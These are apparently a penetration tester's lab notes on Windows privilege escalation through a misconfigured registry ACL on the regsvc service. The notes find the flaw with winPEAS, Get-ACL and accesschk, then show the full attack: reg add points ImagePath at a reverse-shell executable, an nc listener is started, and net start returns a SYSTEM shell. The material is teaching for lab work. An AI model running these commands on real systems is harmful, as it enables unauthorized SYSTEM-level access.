
# Weak Registry Permissions
The Windows [registry](../../../../computers/windows/registry.md) stores entries *for each service*. Registry entries *have [ACLs](../../../../computers/windows/active-directory/ACLs.md)* and if the ACL is misconfigured, it *may be possible to modify a service's configuration* (even if we can't modify the service directly).
## Check for Misconfigurations
### winPEAS
We can check for misconfigurations service misconfigurations using [winPEAS](../../../../cybersecurity/TTPs/actions-on-objective/tools/winPEAS.md) `servicesinfo` flag:
```powershell
PS C:\Users\admin> .\winPEASany.exe quiet servicesinfo
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop

...

  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles, AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\DACL Service (Administrators [AllAccess])

    HKLM\system\currentcontrolset\services\RasAuto (Administrators [GenericAll TakeOwnership])
    HKLM\system\currentcontrolset\services\Rasl2tp (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RasMan (Administrators [GenericAll TakeOwnership])
    HKLM\system\currentcontrolset\services\RasPppoe (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RasSstp (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\rdbss (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RDMANDK (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\rdpbus (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RDPDR (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RDPNP (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RDPUDD (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\RdpVideoMiniport (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\rdyboost (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\ReFS (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\ReFSv1 (Administrators [TakeOwnership])
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership], Administrators [TakeOwnership])
```
At the bottom of the output, you can see that the `regsvc` service (the registry) has a misconfiguration. We can double check it with `Get-ACL`
#### Verify with `Get-ACL`
To check the ACLs of the `regsvc` service, run `Get-ACL` (remember to add the `:` in the path):
```powershell
PS C:\Users\admin> Get-ACL HKLM:\system\currentcontrolset\services\regsvc | Format-List

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
```
### Verify with `accesschk.exe`
[AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) is a SysInternals tool. We can use it to verify the misconfiguration in `regsvc` by giving it the registry key path:
```powershell
PS C:\Users\admin> ./accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
HKLM\System\CurrentControlSet\Services\regsvc\Security
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
```
## Privilege Escalation
With the above misconfigured registry key, we can gain [privesc](../../../../cybersecurity/TTPs/actions-on-objective/privesc/README.md) by *overwriting the `regsvc`'s `ImagePath` value* to point directly at our own [reverse shell](../../../../cybersecurity/TTPs/exploitation/rev-shell.md) executable. 
### `reg add`
We can do this using the `reg` command with the `add` flag:
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\admin\reverse.exe /f
```
Make sure you use *the full path* for `ImagePath`. The idea here is we are replacing `ImagePath` with the path to our reverse shell executable.
### Reverse Shell
Start a listener on your attack box:
```bash
nc -lvp 44444
```
Once we've done that, we have can start the `regsvc` service which will invoke our revshell which `ImagePath` is pointing to. We can start the service with the `net start` command sequence:
```powershell
net start regsvc
```
Over on our listener, we should see our revshell connection:
```bash
┌─[25-07-24 18:32:55]:(root@10.0.2.15)-[~/tibs]
└─# nc -lvp 44444
listening on [any] 44444 ...
10.0.69.5: inverse host lookup failed: Unknown host
connect to [10.0.69.4] from (UNKNOWN) [10.0.69.5] 53964
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>tiddies
tiddies
'tiddies' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
nt authority\system
```

> [!Resources]
> - [AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) 